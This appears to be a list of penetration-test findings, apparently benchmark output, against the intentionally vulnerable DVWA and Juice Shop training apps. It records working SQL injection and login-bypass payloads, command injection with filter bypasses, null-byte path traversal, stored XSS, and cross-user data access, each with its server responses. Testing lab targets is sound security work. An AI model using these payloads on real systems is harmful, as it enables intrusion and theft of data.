findings.title: [security=high] SQL Injection via session-input.php -> /vulnerabilities/sqli/ id parameter
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> 'Security level is currently: high'
findings.response_evidence: [security=high] TRUE payload 1' OR '1'='1' # via session-input.php, then GET /vulnerabilities/sqli/ returned 5 records: ID: 1' OR '1'='1' # First name: admin Surname: admin; First name: Gordon Surname: Brown; First name: Hack Surname: Me; First name: Pablo Surname: Picasso; First name: Bob Surname: Smith. FALSE payload 1' AND '1'='2' # returned zero records (no 'First name:' / 'Surname:' rows in the results block). Page body reads 'Security Level: high'. Session metadata field showed 'low' but the security.php page explicitly stated 'Security level is currently: high'.

findings.title: SQL Injection (numeric, POST id) on DVWA SQLi page [security=medium]
request_sequence: [security=medium] POST http://dvwa/vulnerabilities/sqli/ session=dvwa_admin form id='1 OR 1=1' Submit=Submit
[security=medium] POST http://dvwa/vulnerabilities/sqli/ session=dvwa_admin form id='1 AND 1=2' Submit=Submit
findings.response_evidence: [security=medium] Page footer shows 'Security Level: medium'. TRUE payload id='1 OR 1=1' returned 5 seeded user records: 'ID: 1 OR 1=1 First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload id='1 AND 1=2' returned zero records (only 'User ID: 1 2 3 4 5' select options, no 'First name/Surname' rows). Note: session_info metadata reported 'low' while the page body reported 'medium'; the page body was used as authoritative.

findings.title: SQL Injection via session-input stored id (quoted, comment-terminated) on DVWA SQLi page [security=high]
request_sequence: [security=high] GET http://dvwa/security.php (token e57c06f494c20aabdd95b1f2d47237da) then POST http://dvwa/security.php security=high, seclev_submit=Submit, user_token=[REDACTED]
findings.response_evidence: [security=high] Page body shows 'Security Level: high' after the security change. TRUE payload stored via session-input.php ('Session ID: 1' OR '1'='1' #'), then GET /vulnerabilities/sqli/ returned 5 seeded user records: 'ID: 1' OR '1'='1' # First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload stored ('Session ID: 1' AND '1'='2' #') and GET /vulnerabilities/sqli/ returned zero records (no 'First name/Surname' rows, only 'Click here to change your ID'). Trailing comment '#' was required for the injection to take effect.

findings.title: OS Command Injection via ip parameter (DVWA Command Injection) [security=low]
request_sequence: POST http://dvwa/security.php form security=low, seclev_submit=Submit, user_token=[REDACTED] -> 302 (level set to low; page then shows 'Security Level: low')
POST http://dvwa/vulnerabilities/exec/ form ip=127.0.0.1; whoami&Submit=Submit (session dvwa_admin)
findings.response_evidence: [security=low] HTTP 200. Ping output followed by the line 'www-data' inside the results block: '...rtt min/avg/max/mdev = 0.023/0.027/0.032/0.003 ms www-data'. Page shows 'Security Level: low'. Web-process identity www-data confirmed via command injection.

findings.title: OS Command Injection via ip parameter using pipe bypass (DVWA Command Injection) [security=medium]
request_sequence: POST http://dvwa/security.php security=medium, seclev_submit=Submit, user_token=[REDACTED] -> 302 ('Security Level: medium')
Control: POST http://dvwa/vulnerabilities/exec/ ip=127.0.0.1; whoami&Submit=Submit -> 200, no command output (';' blacklisted)
findings.response_evidence: [security=medium] Pipe payload 127.0.0.1| whoami returned results block containing 'www-data' (page shows 'Security Level: medium'). Control with ';' returned no ping/whoami output, showing the ';' filter is active. Web-process identity www-data confirmed.

findings.title: OS Command Injection via ip parameter using no-space pipe bypass (DVWA Command Injection) [security=high]
request_sequence: POST http://dvwa/security.php security=high, seclev_submit=Submit, user_token=[REDACTED] -> 302 ('Security Level: high')
POST http://dvwa/vulnerabilities/exec/ ip=127.0.0.1|whoami&Submit=Submit -> 200 (page shows 'Security Level: high')
Control: POST http://dvwa/vulnerabilities/exec/ ip=127.0.0.1| whoami&Submit=Submit -> 200, no command output ('| ' blacklisted)
findings.response_evidence: [security=high] Payload 127.0.0.1|whoami returned results block containing 'www-data' (page shows 'Security Level: high'). Control with pipe+space returned no output, confirming the '| ' filter. Web-process identity www-data confirmed.

findings.title: DVWA Stored XSS in guestbook message field [security=low]
findings.response_evidence: [security=low] POST response returned 200 with new guestbook entry 'Name: verifier Message:' (script tag stored, stripped from visible text). Stored canary is exactly 50 chars (fits maxlength=50). On fresh browser load of /vulnerabilities/xss_s/ as dvwa_admin, the stored script executed: browser_eval_js('window.xss_flag') returned 1. Security level confirmed low in session_info.

findings.title: DVWA security.php level change without anti-CSRF token (not exploitable)
request_sequence: POST http://dvwa/security.php security=medium&seclev_submit=Submit (no user_token; Origin: http://attacker.example, Referer: http://attacker.example/csrf.html; session dvwa_admin)
findings.response_evidence: The tokenless cross-site-style POST returned 302 to security.php, but the follow-up GET of /security.php displayed 'CSRF token is incorrect' and 'Security level is currently: low' (session_info security_level=low). The level change was NOT applied, so the endpoint enforces a per-request user_token and the CSRF check blocks this forged request. Note: the 302 status alone would be misleading; the page state shows rejection. Level-change CSRF not demonstrated.

findings.response_evidence: acct1 own basket: HTTP 200 {"status":"success","data":{"id":6,"UserId":22,"Products":[{"id":1,"name":"Apple Juice (1000ml)",...,"BasketItem":{"ProductId":1,"BasketId":6,"id":9,"quantity":3}}]}}. acct2 (session_info own_basket_id=7, email acct2_bench@juiceshop.local) requesting basket 6: HTTP 200 with identical body — id 6, UserId 22 (acct1's), Products: Apple Juice (1000ml), quantity 3. Account 2 is not the owner and still retrieved Account 1's distinct seeded item.

findings.title: Confidential document exposed via open directory listing at /ftp/ (acquisitions.md)
request_sequence: GET http://juiceshop:3000/ftp/ with headers Accept: text/html,application/json (unauth)
findings.response_evidence: Listing: HTTP 200 text/html 'listing directory /ftp/' with entries including acquisitions.md (909 bytes), legal.md, package.json.bak, incident-support.kdbx, etc. Direct retrieval GET /ftp/acquisitions.md: HTTP 200 text/markdown, body: '# Planned Acquisitions > This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...'. Listing reveals and unauthenticated retrieval returns the confidential memo. CWE-548 (encryptionkeys) is not evidenced by this endpoint and was not claimed here.

findings.title: Cross-user basket access (BOLA) via GET /rest/basket/{basketId}
findings.response_evidence: Acct1 (own basket 6): {"status":"success","data":{"id":6,"UserId":22,...,"Products":[{"id":1,"name":"Apple Juice (1000ml)",...,"BasketItem":{"ProductId":1,"BasketId":6,"id":9,"quantity":3}}]}}. Acct2 (authenticated as acct2_bench@juiceshop.local, whose own basket is 7) received the identical body: basket id 6, UserId 22 (Account 1's user), containing Apple Juice (1000ml) quantity 3. Acct2 is not the owner, so the server returned another user's basket without an ownership check.

findings.response_evidence: Listing at /ftp/ (unauthenticated, 200) shows entry 'acquisitions.md 909'. Our company plans to acquire several competitors within the next year. This will have a significant stock market impact..."

findings.title: Poison null-byte path traversal bypasses /ftp/ backup file restriction
request_sequence: GET http://juiceshop:3000/ftp/package.json.bak (unauth) -> 403 'Error: Only .md and .pdf files are allowed!'
findings.response_evidence: Raw path returned HTTP 403 with body 'Error: Only .md and .pdf files are allowed!'. The null-byte variant /ftp/package.json.bak%2500.md returned HTTP 200 with the restricted backup file contents: '{ "name": "juice-shop", "version": "6.2.0-SNAPSHOT", "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": {...} }'. The filter is bypassed by the URL-encoded null byte followed by the allowed .md extension.

findings.title: Exposed encryption-keys directory with browsable listing
findings.response_evidence: HTTP 200 unauthenticated. Body: 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM'. Links to /encryptionkeys/jwt.pub and /encryptionkeys/premium.key are present, so the directory is browsable and exposes the sensitive key files named in the criteria.

findings.title: Product-Search SQL Injection (q parameter) on /rest/products/search
findings.response_evidence: Benign q=apple: 200 with legitimate products (Apple Juice (1000ml), Apple Pomace). Single quote q=qwert': HTTP 500 body 'Error: SQLITE_ERROR: near "'%'": syntax error'. UNION payload q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--: HTTP 200 with body {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}] — injected columns reflected, confirming UNION injection into the SQLite query. Not a sanitized benign response.

findings.title: Unauthenticated User-Feedback listing (possible PII exposure) on /api/Feedbacks/
findings.response_evidence: Endpoint returns 8 feedback records without authentication, including UserId and comment fields. Author emails are masked in the comment text, e.g. '(***in@juice-sh.op)', '(***@juice-sh.op)', '(***ereum@juice-sh.op)'; anonymous entries show '(anonymous)'. No full email address is disclosed in any record, so the CWE-359 email-PII criterion is not met. Unauthenticated access to UserId values is a partial exposure only. Recommend Coordinator decide whether to pursue a separate check (e.g. whether the masked local-part/domain reveals enough to be considered PII).

findings.title: Login authentication bypass via SQL injection in email field (POST /rest/user/login)
request_sequence: POST http://juiceshop:3000/rest/user/login (session unauth) Content-Type: application/json body: {"email": "' OR 1=1--", "password": "x"}
findings.response_evidence: HTTP 200 application/json: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. A valid authentication token was issued for the first user (admin@juice-sh.op) with an arbitrary password, unauthenticated, proving the email parameter is injected into the SQL login query.

findings.title: Unauthenticated access to user feedback records with partially masked author emails (GET /api/Feedbacks/)
findings.response_evidence: HTTP 200 without authentication, returning 8 feedback records with UserId and comment fields. Author emails appear only partially masked inside comment text, e.g. "(***in@juice-sh.op)", "(***@juice-sh.op)", "(***ereum@juice-sh.op)"; anonymous entries show "(anonymous)". No full author email address is disclosed in the response, so the strict PII criterion (disclosure of author email addresses) is not met. Unauthenticated access to the feedback data itself is confirmed, and partial email fragments plus UserId linkage are a possible information-exposure concern. Recommend the Coordinator decide whether partial masking counts as PII exposure.

findings.title: Juice Shop /rest/user/whoami information disclosure (not reproduced)
findings.response_evidence: All three requests returned HTTP 200 with application/json body exactly {"user":{}}. The authenticated acct1 session (session_info email=acct1_bench@juiceshop.local, own_basket_id=6) and the unauthenticated session received identical bodies, and the fields=id,email,password,role,lastLoginIp parameter added no data. No email, id, role, password, or IP was disclosed to any caller. Caveat: the empty user object was returned even to the authenticated session, so the harness may not be applying the account's bearer token to this request; a token-bearing check was not possible because no acct1 credentials are available to this agent. The observed CWE-200 leak is therefore not reproduced.
